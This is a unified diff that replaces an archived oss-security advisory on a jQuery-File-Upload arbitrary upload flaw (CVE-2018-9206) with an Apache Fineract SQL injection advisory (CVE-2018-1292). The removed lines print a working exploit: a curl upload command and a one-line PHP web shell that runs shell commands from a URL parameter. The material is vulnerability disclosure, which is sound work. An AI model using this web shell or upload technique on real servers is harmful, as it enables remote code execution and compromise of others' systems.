@@ -1,35 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/11/2
-Message-id: <70dba524-20af-4af3-9c45-698d762e1a4a@me.com>
-Date: Thu, 11 Oct 2018 16:06:21 +0000 (GMT)
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject:  jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/04/19/4
+Message-ID: <CAPnWRThjRX_eRwBEHmHTp1gHSzmprSxVDzpFEojJ4-fd88bj=w@mail.gmail.com>
+Date: Thu, 19 Apr 2018 14:31:14 -0700
+From: Ed Cable <edcable@...os.org>
+To: user@...eract.apache.org, Dev <dev@...eract.apache.org>,  security <security@...che.org>, oss-security@...ts.openwall.com,  圆珠笔 <627963028@...com>
+Subject: [SECURITY] CVE-2018-1292: Apache Fineract SQL Injection Vulnerability - Injection via reportName parameter
 Content-Type: text/plain; charset=utf-8
 
-Title: jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
-Author: Larry W. Cashdollar, @_larry0
-Date: 2018-10-09
-CVE-ID:[CVE-2018-9206]
-Download Site: https://github.com/blueimp/jQuery-File-Upload/
-Vendor: https://github.com/blueimp
-Vendor Notified: 2018-10-09
-Vendor Contact:
-Advisory: http://www.vapidlabs.com/advisory.php?v=204
-Description: File Upload widget with multiple file selection, drag&drop support, progress bar, validation and preview images, audio and video for jQuery. Supports cross-domain, chunked and resumable file uploads. Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads.
-Vulnerability:
-The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php doesn't require any validation to upload files to the server. It also doesn't exclude file types. This allows for remote code execution.
+Severity: Critical
+
+Vendor:
+The Apache Software Foundation
+
+Versions Affected:
+Apache Fineract 1.0.0
+Apache Fineract 0.6.0-incubating
+Apache Fineract 0.5.0-incubating
+Apache Fineract 0.4.0-incubating
+
+Description:
+
+Within the 'getReportType' method, a hacker could inject SQL to read/update
+data for which he doesn't have authorization for by way of the 'reportName'
+parameter. Apache Fineract exposes different REST end points to query
+domain specific
+entities with a Query Parameter 'orderBy' which
+are appended directly with SQL statements. A hacker/user can inject/draft
+the  'orderBy'  query parameter by way of the "order" param  in such a way
+to
+to read/update the data for which he doesn't have authorization.
+
+Mitigation:
+All users should migrate to Apache Fineract 1.1.0 version
+https://github.com/apache/fineract/tree/1.1.0
 
 
-Exploit Code:
-$ curl -F "files=@...ll.php" http://localhost/jQuery-File-Upload-9.22.0/server/php/index.php
+Credit:
+This issue was discovered by 圆珠笔 (627963028@...com)
 
-Where shell.php is:
+References:
+http://fineract.apache.org/
+https://cwiki.apache.org/confluence/display/FINERACT/Apache+
+Fineract+Security+Report
 
-<?php
-$cmd=$_GET['cmd'];
-system($cmd);
-?>
-Screen Shots:
-Notes: Actively being exploited in the wild. https://github.com/blueimp/jQuery-File-Upload/pull/3514
-Content of type "text/html" skipped
+Regards,
+Apache Fineract Team
+
